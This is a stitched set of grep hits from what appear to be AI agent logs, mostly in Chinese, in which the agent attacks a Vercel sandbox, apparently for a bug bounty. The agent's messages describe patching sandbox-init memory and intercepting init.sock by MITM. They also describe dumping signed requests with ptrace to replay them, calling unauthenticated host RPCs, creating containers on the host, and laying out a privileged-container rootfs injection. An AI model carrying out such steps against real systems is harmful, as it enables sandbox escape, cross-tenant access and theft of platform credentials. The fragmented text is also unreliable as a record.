@@ -1,0 +1,548 @@
+################ e1507845 (16 hits) ################
+-----
+代码复用："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"J518 模板完整（POKE 字节 `48 31 c0 48 31 db c3 90`、curl `--http2-prior-knowledge --unix-socket`、Spawn 用 connect+proto+5B envelope）。
+
+现在写 **J521：核心提权验证**——POKE 后 Spawn 进程，对比其 CapEff/Seccomp 与基线，并测试 SpawnRequest 的 uid/gid 字段是否可提权到 root："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"等待 J521 执行（建 sandbox + POKE + 3 次 Spawn，约 1 分钟）："}]}}
+{"role":"assistant","m
+-----
+nt","message":{"content":[{"type":"text","text":"**J540 空欢喜**：containerd/cell/apm/metrics socket **在 guest 文件系统不存在**（ls/curl 确认不可访问）——`/proc/1/net/unix` 显示的是 **host 的 unix socket 表**！但发现关键线索：**`/run/cell/ca-cert.pem`（vercel-proxy CA）被 bind mount 进 guest** → 出网走 host 透明代理。看 J539 完整输出找路由/现有连接："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"**J539 完整输出——重大拓扑发现**：
+
+- guest 本地 **23456 端口监听** + **5 条到网关 `100.64.0.1:56044/560
+-----
+察："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"**突破信号**：d1 空 JSON `{}` → **202 Accepted + `{"request_id":"..."}`**！而 msgpack → **415 Unsupported Media Type**——debugger 端点是 **JSON API**！之前 J471 的 202 和 msgpack 假设都错了方向。看完整输出："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"d1 确认 JSON 格式 + 202 + `request_id`——**未认证的 host agent 接受了我们的输入**！但脚本又在第 3 个连接卡住。这次用 
+-----
+2 和 msgpack 假设都错了方向。看完整输出："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"d1 确认 JSON 格式 + 202 + `request_id`——**未认证的 host agent 接受了我们的输入**！但脚本又在第 3 个连接卡住。这次用 **HTTP/1.1 keep-alive 复用单连接**发所有请求（彻底绕过连接限制），并且全部用 JSON 格式测 debugger 系端点："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"低级错误——sender 里忘了 `import json`。修复重跑："}]}}
+{"role":"assistant","message":{"content":[
+-----
+*J482 重大收获**：
+
+1. **r8 `/v0.7/config` → 500 泄露内部 gRPC schema**：`"client is a required field for client config update requests"`——需要完整的 **`client`** 字段（不是 `client_tracer`！）
+2. **r6 `/telemetry/proxy/` → 200 OK {}**（带斜杠才通）
+3. **r7 `/v0.3/traces` → 200 "OK."**（`\\x91\\x90` payload 格式正确）
+4. 四语言探针全 202，但 **`Datadog-Agent-State` 稳定不变**（`c5834e90...` 是 host 指纹）
+5. 又一个 bug 确认：**每个进程第二次新建连接必卡**——后续每轮用新沙箱规避
+
+下一步：用**正确的 `client` 字段**注册 v0.7/config（trace age
+-----
+"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"确认：tracer 用 **GET** 请求 /v0.7/config。现在看 newUpdateRequest() 构造的 body 结构——tracer 怎么标识自己的类型："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"**找到了**：L853 `IsTracer: true` + `ClientTracer`。看完整构造："}]}}
+{"role":"assistant","mess
+-----
+= `application/proto` + 裸 protobuf；streaming（Spawn）= `application/connect+proto` + 5B envelope，错误以 JSON 返回
+
+现在提取 SpawnRequest 字段 schema（本地 grep Getter 符号，零成本）："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"没有 Getter 符号（新版 protobuf 内联了）。**更直接的方案：J519 MITM 抓包**——同目录 rename init.sock（修复 EXDEV
+-----
+text","text":"没有 Getter 符号（新版 protobuf 内联了）。**更直接的方案：J519 MITM 抓包**——同目录 rename init.sock（修复 EXDEV），透明代理抓 host 的真实 SpawnRequest（直接看到字段号）："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"Bug：`os.system(..., flush=True)` 不合法导致脚本崩溃（rename 未执行）。而且触发 cmd 成功说明 **cmd 通道可能不走 in
+-----
+"text":"快照删除释放有延迟。写重试脚本等待配额恢复："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"等配额恢复的同时，本地提取 SpawnRequest 完整字段 schema（从二进制里的 protobuf descriptor）："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"Go 新版 rawDesc 非 gzip。换方案——从 funcnames 找 `service.(*SpawnService).Spawn` 地址，反汇编看它读哪些字
+-----
+n2. **ptrace 内存 dump 拿到 host 真实签名请求**：`@c0003b210b` 处有完整 `X-Signature: b9qZ...` + `X-Timestamp: 1787737525`，**还泄露了 SpawnRequest protobuf 明文**：`\
+\\x02sh` (field1=command) + `\\x12\\x02-c` `\\x12\\x0eecho cmd-alive` (field2=args repeated) + `"\\x0f/vercel/sandbox` (field4=cwd)
+3. **TCP 2050 无监听**（bind 成功无意义），23456 被占（EADDRINUSE 正常）
+
+**下一步核心实验 J521**：POKE 后通过 Spawn 启动进程——**关键问题：Spawn 出来的进程是否继承 sandbox-init 的全 CapEff（0x1ffffffffff）**？若是 = 沙箱内提权链第一步。
+-----
+nix-socket`、Spawn 用 connect+proto+5B envelope）。
+
+现在写 **J521：核心提权验证**——POKE 后 Spawn 进程，对比其 CapEff/Seccomp 与基线，并测试 SpawnRequest 的 uid/gid 字段是否可提权到 root："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"等待 J521 执行（建 sandbox + POKE + 3 次 Spawn，约 1 分钟）："}]}}
+{"role":"assistant","message":
+-----
+求抓取，修复诊断）+ Kill body 捕获："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"**J529 收获巨大**：
+1. **KillRequest schema 破解**：BODY(10) = `0a 06 "proc_3" 10 09` → **{field1: proc_id("proc_3"), field2: signal(9=SIGKILL)}**——Kill 按 sandbox-init 内部进程 ID 杀进程！
+2. **抓到 host 自动 Kill**（sandbox 创建时清理 proc_3）+ 完整 Spawn 签名请求（含 `X-Signature` + `X-Timestamp` + body）
+3. **重放验证所需材料齐备**：捕获的请求可在不 POKE 状态下原样重放
+
+现在 **J530 三合一**：①不 POKE 重放捕获请求（验证时间戳无 fre
+-----
+t","text":"命令超长被截断，改用 Write："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"解码完成，重大信息：
+
+**SpawnRequest 结构**（107B body = connectrpc 格式 `[flag][varint len][proto]`）：`field1="sh" field2="-c" field3=<cmd> field4="/vercel/sandbox"` + X-Signature(ed25519) + X-Timestamp
+
+**SpawnResponse 结构**（6 条流消息，每条 `[flag][4B len][gzip]`）：
+- `proc_5` = process id
+- 多条 `field2` = **stdout 流式输出**（我们的命令输出）
+- `"\\x00` = **exit code 0**
+- `{}` = 流结束
+-----
+t` + `CelldService.StartContainer` / `StopContainer`
+- `cell/api/processes.ProcessesAPI.Kill`、`cell/api/containers.KillRequest`
+- `RuncRuntime.Start`(直接操作 runc!)
+- `host/api/host` API
+
+**3. sandbox-controller 镜像 = sandboxctrl + sandbox-init**,镜像 config 泄露 **ExposedPorts: 23456/tcp 和 26661/tcp**!26661 是没探过的端口!
+
+**4. blob 层可直接解包**——sandboxctrl 二进制 11MB 就在里面。
+
+下一步:从二进制里挖出 connectrpc 的**确切路径字符串**(`/xxx.Service/Method` 形态),用 **HTTP/1.1 + JSON 直接调 cell
+-----
+leCpuTime":"1.413s"}  ← 无认证成功调用!
+```
+
+**cell.sock 是开放的 host 控制面!** Exec/Start 是 404 因为方法名不对——V20 挖到的是 `ExecProcessRequest`、`KillProcess`、`ListPids`、`StartContainerRequest` 这些消息名,方法名应该是 `ExecProcess`/`KillProcess`/`StartContainer`。**GetResourceUsage 已经无认证返回 200**——这是第一个实锤:guest 能调用 host 控制面 RPC!
+
+V23:精确挖全量 connectrpc 路径(正则 `v1.Service/Method`)+ 扫全 + streaming 协议打 StreamOutput + 用错误信息反推字段:"}]}}
+{"role":"assistant","message":{"content":[{"type":"tex
+-----
+VE ProcessService/Wait / Kill (字段: process id 32hex)
+STREAM StreamOutput (connect+proto/grpc/json) -> 200 "unary request has zero messages" ← 流式协议通了, 只差发消息!
+字段名泄露: WaitRequest/KillRequest/SetOCIImageConfigRequest protobuf 类型
+```
+
+我的探针构造有个 bug(`"a"*32` 在字节串里变成了 JSON 拼接),导致 unmarshal 错误。现在用正确的 JSON 构造,深挖 Create 容器字段 + 流式 StreamOutput 发消息:"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"**爆炸性进展!V24 在 host 上成功创建了容器!!!**
+
+```
+CRE
+################ d1c9a155 (13 hits) ################
+-----
+lld.Celld`：Configure / Heartbeat / RegisterPort / SetWorkload**
+2. **HTTP/2 PRI 帧得到 SETTINGS 响应**——确认 23456 是 h2 服务！之前 curl --http2 走的是 Upgrade 模式所以 404
+3. **如果这些 gRPC 方法无认证** → 我们能调 `ContainersService/Exec` 在 **microVM 层执行命令**！
+
+J435Q：用 `curl --http2-prior-knowledge` + gRPC 反射拿服务列表，直捣 ContainersService/Exec："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"小问题：沙箱内是 Python 3.9，`subprocess.run` 不接受含 null 字节的 args。改用 shell 管道喂给
+-----
+nectrpc 服务端**，connect 协议用 HTTP/1.1 + JSON 就能调（J435R 只用了 gRPC 协议）
+
+现在写 J435T：用 connect 协议 + 正确服务名重打 23456。严格控制时长防卡死（每个 curl 2s 超时）。"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"运行 J435T："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"第一次输
+-----
+4 被过滤（iptables/eBPF）**！
+- 结合 ESTAB `23456→100.64.0.1:42664`：**23456 很可能是 microVM 层的透明代理/流量出口**（沙箱强制所有出站走它）
+
+验证假设：沙箱内 curl 外网 + iptables 规则 + TLS 证书链（Vercel Network Proxy CA 会暴露 MITM）。写 J435X："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"**突破性结果！**
+1. **沙箱外网全通**（HTTP/HTTPS 直连成功，证书正常无 MITM，iptables 全空）——不是透明代理！
+2. **唯独 
+-----
+通道验证成功**
+5. 1024/1025 仍静默
+
+J465：2050 HTTP/2 路径枚举（HPACK 字面量编码）+ v0.7/config 完整注册 + v0.6/stats msgpack + 检查沙箱内工具（socat/curl 可桥接 vsock→TCP）。"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"J465 输出截断（watchdog 27s），但有信号：`/info` 和 `/v0.7/config` 在 2050 有响应（非 404，解析器显示 "?"），
+-----
+watchdog 27s），但有信号：`/info` 和 `/v0.7/config` 在 2050 有响应（非 404，解析器显示 "?"），其余路径 NO-RESP；工具只有 curl/python3（无 socat/nc，但 **curl 可用 unix socket 桥接**）。
+
+修正策略：J466 缩短每路径超时（300+500ms）、改进帧解析（打印原始 hex）、先做 1026 配置端点（快）、再做 2050 枚举。"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"J466 关键信息：
+
+1. **`POST /v0.6/stats` msgpack → 200 OK**（无认证 stats 提交通道）
+2. `POST /
+-----
+*——之前 404 的原因找到了：
+
+- 服务包名是 **`vercel.hive.celld.api.v1`**（`.vercel.hive.celld.api.v1.RegisterPortResponse`、`.ConfigureRequest`、`.HeartbeatRequest`），不是我们试的 `api.celld.Celld`！
+- 正确路径应该是 `/vercel.hive.celld.api.v1.Celld/Heartbeat` 等
+- 且 celld 是 **connectrpc 服务端**，connect 协议用 HTTP/1.1 + JSON 就能调（J435R 只用了 gRPC 协议）
+
+现在写 J435T：用 connect 协议 + 正确服务名重打 23456。严格控制时长防卡死（每个 curl 2s 超时）。"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"运行
+-----
+"type":"text","text":"完整服务路径到手：**`/vercel.sandbox.spawn.v1.SpawnService/{Spawn,Kill,Ping,SpawnInteractive}`**。现在提取 SpawnRequest 的字段定义（protobuf struct tag 是明文的）："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"正则写错了，看实际 tag 格式："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","tex
+-----
+{"type":"text","text":"正则写错了，看实际 tag 格式："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"拿到了 SpawnRequest 核心字段：`command`、`arguments`、`environment`、`working_directory` + KillRequest(`process_id`,`signal`)。现在关键是拿到 **agent 真实请求帧样本**（之前的 ptrace 抓帧技术），看 SpawnRequest 完整 JSON 字段。搜本地记录："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"这些是符号表。找之前抓 agent 帧的实验输出（真实 SpawnRequest JSON）："}]}}
+{"role":"assistant","mess
+-----
+整 JSON 字段。搜本地记录："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"这些是符号表。找之前抓 agent 帧的实验输出（真实 SpawnRequest JSON）："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"这些只是符号表。不过没关系——**现在协议完全清楚了，直接发 connectrpc 请求探测**。关键测试：① 无签名请求各方法的响应（判断签名是否覆盖所有方法，Pin
+-----
+pe":"text","text":"**跨沙箱共享排除**（marker 不存在，vda 每沙箱独立模板副本；写后 remount 持久但只影响本沙箱）。
+
+现在回到真正未完成的攻击面：**抓 agent 签名帧 + 重放 SpawnRequest**。新方案用 sudo root + **MSG_PEEK 窥探**（不消费数据，不干扰 sandbox-init）：轮询 /proc/1/fd 发现新连接 → pidfd_getfd dup → 窥探完整请求帧（含 X-Signature）→ 外部并行触发 API cmd 制造请求："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"本地脚本 %s 格式化冲突，修复："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","tex
+-----
+ant","message":{"content":[{"type":"text","text":"NewClient 结构清晰：GenerateKey → 构造带拦截器的 httpClient → **两次 NewSpawn**（baseURL = 0x9fa47d，16 字符），私钥/公钥都存在返回对象里（+0x20/+0x38）。现在 dump baseURL 字符串 + 反汇编 func1/func2（拦截器本体）+ 找 main.run 的 NewClient 调用参数："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"**baseURL = `"http://localhost"`**（16 字符）！sandboxctrl 的 spawner 客户端连 **localhost:8
+-----
+/func2（拦截器本体）+ 找 main.run 的 NewClient 调用参数："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"**baseURL = `"http://localhost"`**（16 字符）！sandboxctrl 的 spawner 客户端连 **localhost:80**。而 func2 是自定义 `DialContext`（network 字符串 4 字符 = "tcp4"）。继续看 func1 和 NewClient 调用点："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"func1/func2 都是自定义 `DialContext`。**NewClient 调用者 = `internal/sandbox.(*UserlandExecut
+-----
+role":"assistant","message":{"content":[{"type":"text","text":"0x9a5826 是数据不是字符串——先不纠结 Dial 细节。**核心突破**：NewClient 的 baseURL = **`/run/vercel/share/init.sock`**！
+
+这意味着：**sandboxctrl（客户端）通过 connect 协议 + ed25519 签名调用 init.sock（sandbox-init 服务端）**——而我们 guest 内就有这个 init.sock！现在提取 spawn 服务的完整路径（服务名 + 方法），准备直接在沙箱内打 init.sock："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"spawn 服务确认存在（Spawn/Kill/Ping/SpawnInteractive），还有 proto 描述符
+################ 558c85f7 (3 hits) ################
+-----
+2c TCP 入口**（之前 HTTP/1.1 探测全 404 是因为它只处理 HTTP/2！）。响应含 gzip 压缩的 Spawn 事件流。
+
+现在：① 本地解码抓到的 HPACK 头（找 X-Signature 值）② 沙箱内用 curl --http2-prior-knowledge 测 23456 无签名请求："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"hpack 库就绪。写 J 实验：完整抓包存原始字节 + 沙箱内 curl h2c 无签名测试 23456："}]}}
+{"role":"assistant","mes
+-----
+e 测 23456 无签名请求："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"hpack 库就绪。写 J 实验：完整抓包存原始字节 + 沙箱内 curl h2c 无签名测试 23456："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"抓到 9KB 原始流量！本地解析——TCP 流重组 + HPACK 解码 + protobuf 解析："}]}}
+{"role":"assistant","messag
+-----
+ntent":[{"type":"text","text":"**巨大突破！！** 抓包显示 agent→23456 是 **HTTP/2（h2c preface `PRI * HTTP/2.0`）** 流量，且**末尾是明文的 SpawnRequest protobuf**（`\
+\\x02sh\\x12\\x02-c\\x12\\x1acat /tmp/capture2.log...` + cwd `/vercel/sandbox` + timeout）！
+
+**结论**：23456 = SpawnService 的 **h2c TCP 入口**（之前 HTTP/1.1 探测全 404 是因为它只处理 HTTP/2！）。响应含 gzip 压缩的 Spawn 事件流。
+
+现在：① 本地解码抓到的 HPACK 头（找 X-Signature 值）② 沙箱内用 curl --http2-prior-knowledge 测 23456 无签名请求："}]}}
+{"role":"assista
+################ 8b33948a (4 hits) ################
+-----
+`。先提取 proto 字段名（json tag），构造请求体："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"proto 字段齐了：`SpawnRequest{command, arguments, environment, working_directory}`、`KillRequest{process_id, signal}`、Pty `cols/rows`。现在写 J396——fork 子进程直连 4 个方法（Connect JSON 协议）："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"J396 结果：4 个方法全部零响应（只有 SETTINGS ACK）。对比 J390 发现**关键差异——我们从未发送 SETTINGS ACK**！
+
+- J3
+-----
+le":"assistant","message":{"content":[{"type":"text","text":"body 构造长度错误导致 unmarshal 失败。先看 API 对照组的权限输出 + 查本地逆向数据找 SpawnRequest 字段定义："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"API cmd 有全量 caps（CapEff=ffffffffff）。查本地逆向数据找 SpawnRequest 字段："}]}}
+{"role":"assistan
+-----
+}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"API cmd 有全量 caps（CapEff=ffffffffff）。查本地逆向数据找 SpawnRequest 字段："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"本地符号表无 proto 字段名。修复 PB 构造（程序化长度）+ **新增无签名 RPC 测试**（Ping/Kill/SpawnInteractive 是独立方法，
+-----
+就是描述符起点），修正："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"**完整 spawn.proto schema 提取成功！** SpawnRequest 仅 4 字段（command/arguments/environment/working_directory），KillRequest 有 signal 字段。存档后重试限流："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"配额恢复，重跑 J421 双沙箱裁决实验："}]}}
+{"role":"assistant","message":{"content":[{"type":"text",
+################ 494b74ea (3 hits) ################
+-----
+t":"v32 有多个问题，先看完整输出定位："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"v32 诊断：busybox 下载失败（网络不通或 curl 静默失败）、`<SK>/fs` 目录不存在（**active 快照可能不走 overlayfs 数字目录**——`CONTAINER_ROOTFS_SOURCE=drive` 提示 rootfs 来自 celld drive，且 v29 发现过 `/mnt/vda/mnt/drives/`）。且 v31 的 spec 输出被截断，mounts 段没看到。
+
+v33 转向硬侦察：读 **runc config.json**（真实 root.path/mounts）+ `ctr snapshots mounts` + 挖 `/mnt/vda/mnt/drives/` + 多路静态 shell 来源："}]}}
+{"role":"assistant
+-----
+d /run/containerd
+    51→```
+    52→
+    53→**Step 4 — Inject a rootfs onto the guest disk**
+    54→```bash
+    55→curl -sL -m 60 -o /tmp/aroot.tar.gz https://dl-cdn.alpinelinux.org/alpine/v3.20/releases/x86_64/alpine-minirootfs-3.20.3-x86_64.tar.gz
+    56→mkdir -p /mnt/vda/pwnrootfs \u0026\u0026 tar -xzf /tmp/aroot.tar.gz -C /mnt/vda/pwnrootfs
+    57→```
+    58→
+    59→**Step 5 — Create an arbitrary privileged container via the guest containerd,
+-----
+pe":"text","text":"100.64.0.1 不可达（EHOSTUNREACH），127.0.0.1 是 404。需要确认 23456 的真实身份和 connect 服务的真实监听位置——最后一次逃逸情报收集（guest 侧 curl 23456 + 找 unix/vsock socket）："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"关键线索：之前 guest 侧 LISTEN 只扫了 `tcp6`，可能漏了 IPv4 监听（`:80`）。查之前沙箱内的完整监听扫描结果："}]}}
+{"role":
+################ 1a7a395a (11 hits) ################
+-----
+estore / 策略热更新）时，网络策略/凭据注入有没有状态残留或空窗？比如：boot 完成前发包能不能出网？策略更新后旧连接是否还活着？
+
+**为什么非普遍**：需要 API 深度交互（snapshot/restore 生命周期），curl 一遍扫不出来；而且每个 sandbox 的状态机都不一样，必须逐对象建模。
+
+## 提案 2：对象引用完整性（控制面的"逻辑缝"）
+
+**具体问题**：
+- 创建 sandbox 时，传**另一个 project 的 ID**（混合对象引用）——API 接受吗？接受=对象隔离缺陷
+- sandbox **删除后**，它的 session ID 还能执行命令吗？（生命周期没级联 = 幽灵对象）
+- 同一账号下建**第二个 team**，用 team A 的 token 操作 team B 的对象——如果同账号的 team 间都隔不开，跨账号大概率也破（同一授权代码路径）
+
+**为什么非普遍**：这是"对象关系推理"不是端点枚举。不需要第二账号——*
+-----
+{"type":"text","text":"**API 面重要结果**：
+- **A3 突破：command 字段可以是任意二进制**——`bash -c id` 成功（uid=1000 vercel-sandbox）、sh/node/curl 都执行！之前只用 python3 太受限
+- A2 承诺#3 成立（删除后 exec → 404）✅
+- A4/A6 正常隔离；A5 测试代码有 bug（URL 没用 tid）
+- **新信息：`persistent:true`、`timeout:300000`（5分钟不活跃自动停）、`region:iad1`、自动快照机制**
+
+用 bash 通道深挖 sandbox 环境（mount/capabilities/fd/dmesg）+ API 端点盲测（restore/resume 等未文档化端点）："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"**
+-----
+8h）：设备初始化（status 流程 + feature 协商）→ RX/TX 队列设置（DMA 页用 pagemap 拿 GPA + mlock 防换出）→ DRIVER_OK → 对 host (CID=2) 端口发 connect REQUEST："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"输出在 `devid=19` 后中断——**写 status=0（reset）杀进程**（J288g 写 status=1/3 没死，差异在值）。可能 Firecrac
+-----
+初始化流程完整跑通（ACK→DRIVER→FEATURES_OK→RX/TX 队列→DRIVER_OK→notify）。注意读回恒 0（Firecracker 读回行为），但**设备行为才是关键**——现在用 TX 队列发 connect REQUEST 到 host（CID=2），轮询 RX used ring 看设备是否响应："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"继续运行 J288l（virtio-vsock 驱动完整链路实验）："}]}}
+{"role":"assistant","message":{"content":[{"
+-----
+acker block 后端的 sector 边界检查："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"**block 后端有完整边界检查**（`Request::parse` 检查 `top_sector > num_disk_sectors`，测试确认越界被拒）——block 越界线也收敛。
+
+**重新评估局面：**
+- vsock 设备：内核驱动占用 + reset 被 Vercel patch（FAILED 锁死）
+- 但还有一条**绕过 seccomp 的经典路**：**io_uring 的 `IORING_OP_SOCKET`**！seccomp 只在 syscall 入口过滤，io_uring 内部的 socket 创建**不走 syscall 路径**——如果 sandbox 允许 io_uring，就能绕过 AF_VSOCK 拦截拿到 vsock fd！
+
+写 J288t：io
+-----
+ader leakage
+Platform injects x-vercel-oidc-token, x-vercel-protection-bypass, and x-vercel-proxy-signature into every request without stripping. Capture of these headers from a sandbox workload is in scope only if the exfiltration channel is a Vercel-side defect, not a third-party site reflecting them.
+A report that chains one of the above known primitives into a new host-compromise, cross-tenant, or firewall-bypass-with-exfil impact is still el
+-----
+d "I can provide a PoC if needed" are not eligible. The PoC must be in the initial submission or provided promptly on request.
+Patch suggestions are welcome and may be considered when placing the award inside the severity range.
+Disclosure policy
+This program uses Limited Coordinated Vulnerability Disclosure. Reports start private. Public disclosure of vulnerability details is not permitted until the embargo below has expired, and then only as de
+-----
+One extension maximum. Vercel will state the new date on the report.
+If Vercel has not approved or denied a disclosure request within 14 days after the applicable embargo date, you may publish an external write-up (blog, talk) with the redactions in "Never disclose" below. That does not publish the HackerOne report; on-platform disclosure still needs Vercel approval.
+Vercel paying a bounty is not permission to disclose and is not payment for sile
+-----
+ We pay for the report. We still need time to patch production and other reports in the same class.
+After the embargo
+Request disclosure on the HackerOne report. Specify whether you want:
+On-platform (HackerOne) ; Vercel's default is Limited disclosure: summary and timeline only. Proof-of-concept attachments stay hidden. Full disclosure only if Vercel has confirmed the PoC is sanitized (no customer data, no still-working exploit against productio
+-----
+（结果在最后才 print，死前无输出）。即：
+
+1. **主进程累计读 vda 超过阈值 → 被杀**（SPEED 1GB、SCAN 2GB、VDAS2 8MB 全死；J300/J303 用 fork 子进程隔离所以活）
+2. **urlopen 探测 169.254.169.254 → 被杀**（MMDS 两次全空；J303 单次 create_connection 存活但 No route to host）
+
+J307 精确验证这两个杀点："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"又是 `%` 冲突，改用 replace："}]}}
+{"role":"assistant","message":{"content":[{"type":"text",
+-----
+:"text","text":"J307 结果颠覆一切假设：
+
+- **READ2-10 全部 ALIVE**——主进程读 vda 10MB 都不死
+- **URLMMDS：`No route to host` + ALIVE**——urlopen 也不杀进程
+- **MIX 却死在第二次连接后**（输出只有 2 行）
+
+"杀进程"机制忽隐忽现，全部指向**sandbox cmd 输出流不稳定**。用 J303 验证过的可靠方法（fork 隔离 + 落盘 + 逐步 print）重跑所有"死亡"场景，一锤定音："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"**J308 终于抓到现行——确凿的死亡证据链**：
+
+1. **MAIN1G**：`chunk 0`(64MB) → `chunk 1`(128MB) → `ch
+################ 478d0b50 (10 hits) ################
+-----
+ll`、`Ping`、`SpawnInteractive`——**gRPC 服务 + 交互 spawn 功能**
+- 我的手工 HPACK 编码有误（content-type 静态表索引应为 31）导致 GOAWAY
+
+沙箱里有 **curl 8.17.0 带 HTTP2 + UnixSockets 支持**——直接用它！下一步 exp_j43：curl HTTP/2 连接 init.sock + 23456/30001，修正 gRPC 反射请求，并尝试 reflection 枚举服务："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"**关键发现**：
+
+1. **[5] 认证机制实锤**：二进制里有 **`missing signature header` + `missing timesta
+-----
+25519 密钥类型——**init.sock 的 API 需要"签名头 + 时间戳头"认证**，签名密钥是每次沙箱生成的 ed25519 密钥对（`--pubkey`）
+2. **[1] init.sock 支持 HTTP/2**（curl 拿到 HTTP/2 404）
+3. [2] 我的 curl 忘了加端口（连到 80）——低级错误
+4. 23456/30001 对 gRPC HEADERS 无响应——可能认证失败静默关闭，或帧构造仍不完整（缺 END_STREAM）
+
+下一步 exp_j44：**curl 修正端口 + gRPC 帧 body 发送 + sandbox-init 密钥/配置泄露检查**（/proc/1/environ、fd、私钥文件搜索）+ 签名头名确认："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"脚本还在运行，等待完成："}]}}
+{"role":"assistan
+-----
+ 且无输出,需要对比 j61 的成功配置找差异:"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"找到问题了!对比 j61 与 j64:j61 的 curl 命令末尾有 URL `"http://localhost" + path`,而 j64/j63 的 `ccall_raw` **漏掉了 URL**——curl 没 URL 就直接报错退出,stdout 为空,所以全部 NOERR。
+
+另一个关键确认:j61 输出显示服务器响应本身也是 envelope 格式(`\\x02` + BE32 len + payload),且 "got 11 bytes" = `len(body) - 5`,证实请求必须用 `flags(1B) + BE32 len + payload` 封装。
+
+修复并写 exp_j65(带 URL + 完整响应帧解析):"}]}}
+{"role":"assistant","me
+-----
+"text","text":"**关键发现**:TCP 直连全部 OPEN(包括 8.8.8.8、metadata、内网)——但 UDP 只有内网 DNS 172.31.0.2 有响应,外网 UDP 全超时。且 j86 里 spawn 发 curl 到 httpbin 超时(连接建但无数据响应)。这指向:**沙箱策略是"数据面 ACL"(按 IP 白名单丢数据包),不是连接面**。必须验证:发真实 HTTP 数据,看白名单 IP 与外部 IP 的响应差异,并完整测试 metadata:"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"又是嵌套三引号,把 PROBE 内 docstring 改为 `#` 注释:"}]}}
+{"role":"assistant","message":{"content"
+-----
+istant","message":{"content":[{"type":"text","text":"SNI 精确匹配(大小写/子域/后缀全拦截),注入路径关闭。但有一个未解矛盾:j90 里 GET /get 返回 503,而 j86 curl 是 200;且 172.31.0.2:443 返回 awselb 503(该 IP 无 TLS 服务)。**关键判定:代理是"按 SNI 转发到真实域名"还是"SNI 仅作门禁、按客户端目标 IP 转发"**——后者意味着任意 IP:443 可达!用 webhook.site 做决定性实验:"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"关键线索:本地直连 `34.230.248.113`(Host: httpbin.org)也是 503——说明该 IP 本身返回 503,j90 的 503 不一定是代
+-----
+ost 内容类型列表**。对比 j79 成功的方法枚举代码:"}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"关键差异找到了:`_rpc` 用 **curl --unix-socket**(自动协商 HTTP),j99 用手工 raw socket 导致 505/415。同时有个被遗漏的高价值面:**j92 发现的宿主 unix sockets(cell.sock/containerd.sock)在 mount ns 不可达,但 /proc/1/root 可穿透 mount ns**——如果 `connect("/proc/1/root/run/cell/cell.sock")` 可行,就是宿主容器控制级突破。设计 j100 一网打尽:"}]}}
+{"role":"user","message":{"content":[{"type":"text","text":"<user_query>
+卡了 
+-----
+ice`（`include_matches.UNIT = ["celld.service"]`），但后续命中全是 AWS SDK service model 噪音
+- **J30 脚本已就位**：0-100MB 精准 PAT 扫描，`endpoint=`/`bind=`/`listen=` 等模式已加引号约束，可过滤 AWS 模型噪音
+
+现在直接跑 J30："}]}}
+{"role":"assistant","message":{"content":[{"type":"text","text":"输出被 tail 截断，看开头部分和完整命中列表："}]}}
+{"role":"assistant","message":{"content":[{"type":"te
+-----
+[{"type":"text","text":"J38 侦察结果**信息量巨大**，三个关键发现：
+
+1. **`init.sock` 是 HTTP 协议**：连接成功，发 `help\
